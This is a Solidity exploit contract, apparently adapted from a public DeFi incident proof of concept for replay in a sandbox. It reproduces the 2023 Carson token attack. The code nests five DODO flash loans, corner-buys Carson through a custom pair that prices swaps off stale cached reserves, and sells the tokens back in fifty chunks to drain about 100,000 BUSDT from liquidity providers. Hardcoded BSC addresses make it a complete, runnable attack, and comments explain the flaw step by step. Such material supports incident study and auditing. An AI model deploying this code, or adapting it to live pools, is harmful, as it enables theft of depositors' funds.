// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Carson).
// The DeFiHackLabs PoC (test/Carson_exp.sol) runs the whole attack INLINE in
// the Foundry test contract `CarsonTest` (attacker = address(this); the DODO
// flash-loan callback `DPPFlashLoanCall` lives on the test itself), so there
// is no standalone exploit contract to deploy as-is. This contract is a
// faithful, self-contained copy of that inline attack (5-deep nested DODO
// flash-loan cascade -> corner-buy Carson -> 50x fixed-chunk sell-back loop
// -> dump remainder -> repay loans), so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/Carson_exp.sol.
//
// Root cause (Carson token + its custom 0xe0A3... AMM pair, both closed-source
// at extraction time; reconstructed from the execution trace, see
// Carson_exp.md): the custom pair prices every swap off CACHED reserves
// (getReserves()) rather than a post-transfer-balance reconciliation like a
// standard Uniswap-V2 pair. Carson is also a fee-on-transfer ("reflection")
// token that skims ~7% into reward/dead/marketing sinks on every transfer and
// feeds part of that tax back into the pair's own balance without a matching
// counter-asset inflow. A single 1,500,000 BUSDT corner-buy crushes the
// pair's Carson reserve (419,360 -> 36,785) while inflating its BUSDT
// reserve (143,796 -> 1,643,796), skewing the cached marginal price ~130x
// (0.34 -> 44.7 BUSDT/Carson). The attacker then drip-sells Carson back in 50
// fixed 5,000-Carson chunks (the pair only nets 4,650 after tax each time);
// because the pair still prices each sell against the stale, artificially
// thin Carson reserve, every dust-sized chunk redeems an outsized BUSDT
// payout, and the round-trip nets +100,677 BUSDT of real LP value rather than
// the ~7%-per-leg loss a naive fee-token swap would produce.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract CarsonDrain {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant Carson = IERC20(0x0aCD5019EdC8ff765517e2e691C5EeF6f9c08830);

    IDPPOracle constant DPPOracle1 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle constant DPPOracle2 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle constant DPPOracle3 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    // Closed source contract
    IUniRouterV2 constant Router = IUniRouterV2(0x2bDFb2f33E1aaEe08719F50d05Ef28057BB6341a);

    // step 0: kick off the 5-deep nested DODO flash-loan cascade (liquidity sourcing only).
    function run() external {
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPPOracle1)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle2)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), new bytes(1));
        } else if (msg.sender == address(DPP)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), new bytes(1));
        } else {
            // Start exploit. Root cause of the exploit stem from the customized pair contract
            BUSDT.approve(address(Router), type(uint256).max);
            Carson.approve(address(Router), type(uint256).max);
            BUSDTToCarson();
            for (uint256 i; i < 50; ++i) {
                CarsonToBUSDT(5000 * 1e18);
            }
            CarsonToBUSDT(Carson.balanceOf(address(this)));
            // End exploit
        }
        // Repaying flashloans
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function BUSDTToCarson() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(Carson);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1_500_000 * 1e18, 0, path, address(this), block.timestamp + 1000
        );
    }

    function CarsonToBUSDT(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(Carson);
        path[1] = address(BUSDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp + 1000
        );
    }
}
